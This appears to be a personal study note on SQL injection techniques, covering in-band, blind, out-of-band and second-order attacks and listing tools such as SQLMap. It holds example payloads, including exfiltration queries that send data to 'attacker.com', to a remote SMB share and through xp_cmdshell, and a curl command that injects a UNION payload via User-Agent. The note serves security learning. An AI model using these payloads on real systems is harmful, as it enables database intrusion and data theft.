[[sql]]
![[SQLi types.svg]]
#### In-band SQL Injection
- **Error-Based SQL Injection**: The attacker manipulates the SQL query to produce error messages from the database. These error messages often contain information about the database structure, which can be used to exploit the database further. Example: `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`. If the database version is returned in the error message, it reveals information about the database.
- **Union-Based SQL Injection**: The attacker uses the UNION SQL operator to combine the results of two or more SELECT statements into a single result, thereby retrieving data from other tables. Example: `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`.

#### Inferential (Blind) SQL Injection
- **Boolean-Based Blind SQL Injection**: The attacker sends an SQL query to the database, forcing the application to return a different result based on a true or false condition. By analysing the application’s response, the attacker can infer whether the payload was true or false. Example: `SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`. The attacker can infer the result if the page content or behaviour changes based on the condition.
- **Time-Based Blind SQL Injection**: The attacker sends an SQL query to the database, which delays the response for a specified time if the condition is true. By measuring the response time, the attacker can infer whether the condition is true or false. For example, `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`. If the response is delayed by 5 seconds, the attacker can infer that the condition was true.

####  Out-of-band SQL Injection
**MySQL and MariaDB**
In MySQL or MariaDB, Out-of-band SQL injection can be achieved using [SELECT ... INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) or [load_file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file) command. This command allows an attacker to write the results of a query to a file on the server's filesystem. For example:
 `SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';`
 
**Microsoft SQL Server (MSSQL)**
In MSSQL, Out-of-band SQL injection can be performed using features like [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), which allows the execution of shell commands directly from SQL queries. This can be leveraged to write data to a file accessible via a network share:
 `EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';`
Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration

**Oracle**  
In Oracle databases, Out-of-band SQL injection can be executed using the [UTL_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html) or [UTL_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html) packages. For instance, the UTL_HTTP package can be used to send HTTP requests with sensitive data:
 ```sql
DECLARE   
	req UTL_HTTP.REQ;   
	resp UTL_HTTP.RESP;
BEGIN   
	req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);   
	UTL_HTTP.GET_RESPONSE(req); 
END;
```

#### Examples of Out-of-band Techniques
**HTTP Requests** 
If configured or external scripts or User-Defined Functions.
`SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`.
**DNS Exfiltration**
If configured or external scripts or User-Defined Functions.
Perform DNS lookup.
**SMB Exfiltration**
`SELECT sensitive_data INTO OUTFILE '\\\\attack-machine-ip-with-smb-server\\logs\\out.txt';`

**Important Consideration**
It is important to note that the MySQL system variable `secure_file_priv` may be set. When set, this variable contains a directory pathname, and MySQL will only allow files to be written to this specified directory. This security measure helps mitigate the risk of unauthorised file operations. 
- **When secure_file_priv is Set**: MySQL will restrict file operations such as **INTO OUTFILE** to the specified directory. This means attackers can only write files to this directory, limiting their ability to exfiltrate data to arbitrary locations.
- **When secure_file_priv is Empty**: If the `secure_file_priv` variable is empty, MySQL does not impose any directory restrictions, allowing files to be written to any directory accessible by the MySQL server process. This configuration poses a higher risk as it provides more flexibility for attackers.

#### Second-order SQL injection (stored)

###### Add SQL query to a HTTP header (e.g. `User-agent`) which a stored in `logs` table.
```shell
curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://vuln-machine-ip/httpagent/
```

##### Store procedures

##### Inject into XML or JSON

##### Automation
- **[SQLMap](https://github.com/sqlmapproject/sqlmap)**: SQLMap is an open-source tool that automates the process of detecting and exploiting SQL Injection vulnerabilities in web applications. It supports a wide range of databases and provides extensive options for both identification and exploitation. You can learn more about the tool
- **[SQLNinja](https://github.com/xxgrunge/sqlninja)**: SQLNinja is a tool specifically designed to exploit SQL Injection vulnerabilities in web applications that use Microsoft SQL Server as the backend database. It automates various stages of exploitation, including database fingerprinting and data extraction. 
- [**JSQL Injection**](https://github.com/ron190/jsql-injection): A Java library focused on detecting SQL injection vulnerabilities within Java applications. It supports various types of SQL Injection attacks and provides a range of options for extracting data and taking control of the database.
- **[BBQSQL](https://github.com/CiscoCXSecurity/bbqsql)**: BBQSQL is a Blind SQL Injection exploitation framework designed to be simple and highly effective for automated exploitation of Blind SQL Injection vulnerabilities.